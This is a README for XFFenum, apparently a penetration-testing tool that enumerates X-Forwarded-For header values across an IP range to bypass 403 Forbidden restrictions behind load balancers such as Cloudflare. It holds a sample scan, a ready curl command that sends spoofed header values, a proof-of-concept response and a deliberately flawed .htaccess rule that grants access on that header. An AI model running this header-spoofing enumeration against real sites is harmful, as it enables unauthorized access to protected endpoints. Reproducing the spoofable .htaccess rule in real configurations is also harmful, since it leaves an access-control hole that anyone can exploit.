# XFFenum

A simple tool to bypass 403 forbidden end-points behind load balancers (Cloudflare) based on X-Forwarded-For header

Based on the [enumXFF](https://github.com/infosec-au/enumXFF) by @infosec_au

### Example

```
vavkamil@localhost:~/XFFenum$ python3 xffenum.py -u https://xss.vavkamil.cz/xff -i 192.168.0.0/16
 __  _______ _____                          
 \ \/ /  ___|  ___|__ _ __  _   _ _ __ ___  
  \  /| |_  | |_ / _ \ '_ \| | | | '_ ` _ \ 
  /  \|  _| |  _|  __/ | | | |_| | | | | | |
 /_/\_\_|   |_|  \___|_| |_|\__,_|_| |_| |_|
 X-Forwarded-For [403 forbidden] enumeration

[i] Using URL: https://xss.vavkamil.cz/xff
[i] Using IP range: 192.168.0.0/16
[i] IP addresses in range: 65536
[i] Iterations required: 13108 

673it [00:34, 21.69it/s]

[!] Access granted with 192.168.13.37, 192.168.13.38, 192.168.13.39, 192.168.13.40, 192.168.13.41
[!] curl https://xss.vavkamil.cz/xff -H "X-Forwarded-For: 192.168.13.37, 192.168.13.38, 192.168.13.39, 192.168.13.40, 192.168.13.41"
```

#### Proof of Concept

```
vavkamil@localhost:~$ curl -i https://xss.vavkamil.cz/xff
HTTP/2 403 
date: Wed, 07 Aug 2019 20:02:41 GMT
content-type: text/html; charset=iso-8859-1
set-cookie: __cfduid=d77da0ad10e7a360cce4a28311784c12d1565208161; expires=Thu, 06-Aug-20 20:02:41 GMT; path=/; domain=.vavkamil.cz; HttpOnly; Secure
expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
server: cloudflare
cf-ray: 502bd9832d69c2db-FRA

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /xff
on this server.<br />
</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at xss.vavkamil.cz Port 80</address>
</body></html>
```

##### .htaccess

```
Order Deny,Allow
Deny from all
SetEnvIf X-Forwarded-For "192.168.13.37" AllowAccess
Allow from env=AllowAccess
```

### Usage

```
vavkamil@localhost:~/XFFenum$ python3 xffenum.py -h
 __  _______ _____                          
 \ \/ /  ___|  ___|__ _ __  _   _ _ __ ___  
  \  /| |_  | |_ / _ \ '_ \| | | | '_ ` _ \ 
  /  \|  _| |  _|  __/ | | | |_| | | | | | |
 /_/\_\_|   |_|  \___|_| |_|\__,_|_| |_| |_|
 X-Forwarded-For [403 forbidden] enumeration

usage: xffenum.py [-h] -u URL -i IP_RANGE [-t THREADS] [--no-verify-ssl]

X-Forwarded-For [403 forbidden] enumeration

optional arguments:
  -h, --help       show this help message and exit
  -u URL           Forbidden URL patch to scan
  -i IP_RANGE      Signe IP or range to use
  -t THREADS       number of threads (default: 5)
  --no-verify-ssl  Ignore any and all SSL errors.

Have a nice day :)
```

## References

https://shubs.io/enumerating-ips-in-x-forwarded-headers-to-bypass-403-restrictions/  
https://blog.ircmaxell.com/2012/11/anatomy-of-attack-how-i-hacked.html
